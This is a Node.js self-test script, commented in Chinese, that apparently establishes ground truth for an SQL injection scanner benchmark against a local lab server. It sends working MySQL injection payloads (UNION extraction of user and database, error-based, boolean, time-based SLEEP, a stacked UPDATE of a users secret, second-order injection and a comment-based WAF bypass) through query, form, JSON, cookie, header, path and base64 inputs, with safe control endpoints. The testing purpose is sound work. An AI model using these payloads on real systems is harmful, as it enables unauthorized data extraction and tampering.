// ============================================================================
// selftest —— 用已知 payload 确认每个靶点的「地面真值」(ground truth)
// 只有这里验证为真的注入点，才计入后续检出率的分母。
// ============================================================================
const BASE = process.env.LAB || 'http://127.0.0.1:8231';

const enc = (s) => encodeURIComponent(s);
const get = async (p, headers = {}) => {
  const t0 = Date.now();
  const r = await fetch(BASE + p, { headers, redirect: 'manual' });
  return { status: r.status, text: await r.text(), ms: Date.now() - t0 };
};
const post = async (p, body, json = false, headers = {}) => {
  const t0 = Date.now();
  const r = await fetch(BASE + p, {
    method: 'POST',
    headers: { ...(json ? { 'content-type': 'application/json' } : { 'content-type': 'application/x-www-form-urlencoded' }), ...headers },
    body: json ? JSON.stringify(body) : new URLSearchParams(body).toString(),
    redirect: 'manual',
  });
  return { status: r.status, text: await r.text(), ms: Date.now() - t0 };
};

const TARGETS = [
  { id: 'A1-int-union', kind: 'vuln', tech: 'union', call: () => get(`/shop/item?id=-1 UNION SELECT 1,user(),database()`), prove: (r) => /root@/.test(r.text) },
  { id: 'A2-str-union', kind: 'vuln', tech: 'union', call: () => get(`/shop/search?name=${enc(`x' UNION SELECT 1,user(),database()#`)}`), prove: (r) => /root@/.test(r.text) },
  { id: 'A3-like', kind: 'vuln', tech: 'union', call: () => get(`/shop/find?q=${enc(`%' UNION SELECT 1,user()#`)}`), prove: (r) => /root@/.test(r.text) },
  { id: 'A4-orderby', kind: 'vuln', tech: 'error/boolean', call: () => get(`/shop/sort?by=${enc('(SELECT 1 FROM (SELECT SLEEP(2))x)')}`), prove: (r) => r.ms >= 1800 },
  { id: 'A5-dual-param', kind: 'vuln', tech: 'union', call: () => get(`/shop/detail?id=${enc('-1 UNION SELECT 1,user(),database()-- ')}&cat=0`), prove: (r) => /root@/.test(r.text) },
  { id: 'B6-error', kind: 'vuln', tech: 'error', call: () => get(`/shop/err?id=${enc('1 AND extractvalue(1,concat(0x7e,user()))')}`), prove: (r) => /root@/.test(r.text) },
  {
    id: 'C7-boolean', kind: 'vuln', tech: 'boolean',
    call: async () => {
      const t = await get('/shop/blind?id=1 AND 1=1');
      const f = await get('/shop/blind?id=1 AND 1=2');
      return { status: 200, text: `TRUE=${/FOUND_USER/.test(t.text)} FALSE=${/FOUND_USER/.test(f.text)}`, ms: 0 };
    },
    prove: (r) => r.text === 'TRUE=true FALSE=false',
  },
  { id: 'C8-time', kind: 'vuln', tech: 'time', call: () => get(`/shop/time?id=${enc('1 AND SLEEP(3)')}`), prove: (r) => r.ms >= 2800 },
  { id: 'D9-post-form', kind: 'vuln', tech: 'union', call: () => post('/login', { username: `x' UNION SELECT 1,user(),database()#`, password: 'x' }), prove: (r) => /root@/.test(r.text) },
  { id: 'D10-json', kind: 'vuln', tech: 'union', call: () => post('/api/profile', { uid: '-1 UNION SELECT 1,user(),database()' }, true), prove: (r) => /root@/.test(r.text) },
  { id: 'D11-cookie', kind: 'vuln', tech: 'union', call: () => get('/shop/cookie', { cookie: 'uid=-1 UNION SELECT 1,user(),database()' }), prove: (r) => /root@/.test(r.text) },
  { id: 'D12-xff-header', kind: 'vuln', tech: 'union', call: () => get('/shop/ip', { 'x-forwarded-for': '-1 UNION SELECT 1,user(),database()' }), prove: (r) => /root@/.test(r.text) },
  { id: 'D13-path', kind: 'vuln', tech: 'union', call: () => get(`/shop/user/${enc('-1 UNION SELECT 1,user(),database()')}`), prove: (r) => /root@/.test(r.text) },
  { id: 'D14-base64', kind: 'vuln', tech: 'union', call: () => get(`/shop/b64?id=${Buffer.from('-1 UNION SELECT 1,user(),database()').toString('base64')}`), prove: (r) => /root@/.test(r.text) },
  {
    id: 'E15-second-order', kind: 'vuln', tech: 'second_order',
    call: async () => {
      const sid = 'rt' + Math.random().toString(36).slice(2, 8);
      await post('/account/update', { name: `zz' UNION SELECT 1,2,3,4#` }, false, { cookie: `sid=${sid}` });
      const r = await get('/account/me', { cookie: `sid=${sid}` });
      return { status: r.status, text: r.text, ms: 0 };
    },
    prove: (r) => /<td>4<\/td>/.test(r.text) || /SEC-/.test(r.text) === false && /<td>2<\/td>/.test(r.text),
  },
  {
    id: 'E16-stacked', kind: 'vuln', tech: 'stacked',
    call: async () => {
      await get(`/shop/stack?id=${enc(`1;UPDATE users SET secret='PWNED-STACK' WHERE id=1`)}`);
      const r = await get(`/shop/item?id=${enc(`-1 UNION SELECT 1,secret,3 FROM users WHERE id=1`)}`);
      return { status: r.status, text: r.text, ms: 0 };
    },
    prove: (r) => /PWNED-STACK/.test(r.text),
  },
  {
    id: 'E17-waf-guarded', kind: 'vuln', tech: 'union(waf)',
    call: async () => {
      const blocked = await get(`/waf/item?id=${enc('1 UNION SELECT 1,user(),3')}`);
      const bypass = await get(`/waf/item?id=${enc(`-1 UNION/**/SELECT 1,user(),3-- `)}`);
      return { status: blocked.status, text: `plain=${blocked.status} bypass=${/root@/.test(bypass.text)}`, ms: 0 };
    },
    prove: (r) => r.status === 403,
  },
  // ── 安全对照 ──
  { id: 'F18-safe-item', kind: 'safe', tech: '-', call: () => get(`/safe/item?id=${enc('1 UNION SELECT 1,user(),3')}`), prove: (r) => !/root@/.test(r.text) },
  { id: 'F19-safe-search', kind: 'safe', tech: '-', call: () => get(`/safe/search?q=${enc(`%' UNION SELECT 1,user()#`)}`), prove: (r) => !/root@/.test(r.text) },
  { id: 'F20-safe-rand', kind: 'safe', tech: '-', call: () => get(`/safe/rand?x=${enc(`1' OR 1=1#`)}`), prove: (r) => !/root@/.test(r.text) },
  { id: 'F21-safe-500', kind: 'safe', tech: '-', call: () => get(`/safe/boom?id=${enc(`1'`)}`), prove: (r) => r.status === 500 },
  { id: 'F22-safe-403', kind: 'safe', tech: '-', call: () => get(`/safe/blocked?id=${enc(`1'`)}`), prove: (r) => r.status === 403 },
  { id: 'F23-safe-redirect', kind: 'safe', tech: '-', call: () => get(`/safe/redirect?id=${enc(`1' OR 1=1#`)}`), prove: (r) => r.status === 302 },
  { id: 'F24-safe-static', kind: 'safe', tech: '-', call: () => get(`/safe/static?id=${enc(`1' OR 1=1#`)}`), prove: (r) => r.status === 200 },
];

const out = [];
for (const t of TARGETS) {
  try {
    const r = await t.call();
    out.push({ id: t.id, kind: t.kind, tech: t.tech, truth: !!t.prove(r), status: r.status, sample: (r.text || '').slice(0, 120).replace(/\s+/g, ' '), ms: r.ms });
  } catch (e) {
    out.push({ id: t.id, kind: t.kind, tech: t.tech, truth: false, status: 0, sample: 'ERR ' + e.message.slice(0, 80), ms: 0 });
  }
}
console.table(out.map(o => ({ id: o.id, kind: o.kind, tech: o.tech, truth: o.truth, status: o.status, ms: o.ms })));
const { writeFileSync } = await import('node:fs');
writeFileSync(new URL('./ground-truth.json', import.meta.url), JSON.stringify(out, null, 2));
console.log('ground-truth.json written');
